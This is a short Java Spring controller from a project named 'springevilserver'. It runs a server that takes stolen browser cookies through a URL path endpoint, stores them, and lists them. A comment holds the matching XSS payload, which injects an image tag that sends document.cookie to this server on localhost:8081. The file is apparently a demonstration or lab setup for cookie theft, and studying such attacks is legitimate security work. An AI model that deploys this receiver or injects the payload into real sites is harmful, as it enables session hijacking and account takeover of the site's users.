package com.example.springevilserver;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class MainController {

    private CookieService cookieService;

    public MainController(CookieService cookieService){
        this.cookieService = cookieService;
    }

    @GetMapping("/cookies")
    public String showCookies(){
        return this.cookieService.toString();
    }

    //<script>document.write('<img src="http://localhost:8081/cookies/' + document.cookie + '" alt="Comment" />')</script>
    @GetMapping("/cookies/{cookie}")
    public String addCookie(@PathVariable("cookie") String cookie){
        this.cookieService.add(cookie);
        System.out.println("Cookie: "+cookie+" added");
        return "";
    }

}
